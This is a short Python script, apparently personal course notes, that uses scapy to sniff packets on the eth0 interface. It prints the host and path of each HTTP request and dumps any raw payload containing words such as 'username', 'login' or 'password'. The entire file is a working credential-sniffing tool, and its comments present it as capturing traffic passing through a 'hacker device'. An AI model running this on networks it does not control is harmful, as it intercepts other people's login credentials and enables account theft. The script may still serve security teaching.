#!usr/bin/env python
# PACKET SNIFFER PROGRAM
#-- PERSONAL NOTES --
# PACKETS THAT FLOW THROUGH HACKER DEVICE CAN BE SNIFFED
# VIEW HTTP/POSSIBLE USERNAME & PASSWORD REQUESTS
#-- END OF NOTES --

import scapy.all as scapy
from scapy.layers import http

#function that sniffs packets flowing through a given interface
def sniff(interface):
    # (store) prevents packets from being held in memory/too much pressure on comp/
    # (prn) will call a function everytime a packet is sniffed, (filter) extracts specific information from sniffed packets
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

#gets packets as they come and gets the URL
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

#gets packets as they come and gets the Username/Password
def get_login_info(packet):
    # if the packet has a RAW layer -- username/password found under RAW layer
    if packet.haslayer(scapy.Raw):
        # Raw is a layer, load is a variable of Raw that contains username/pass
        load = str(packet[scapy.Raw].load)
        # checks to see if any of these words are in load, if so print it and break
        keywords = ['username', 'user', 'login', 'password', 'pass']
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    # if the packet has an HTTP layer -- website logins
    if packet.haslayer(http.HTTPRequest):
        # gets URL and prints it out, decodes() turns it from a byte to string
        url = get_url(packet)
        print('[+} HTTP Request >> ' + url.decode())
        login_info = get_login_info(packet)
        if login_info:
            print('\n\n[+] Possible username/password > ' + login_info + '\n\n')
sniff('eth0')

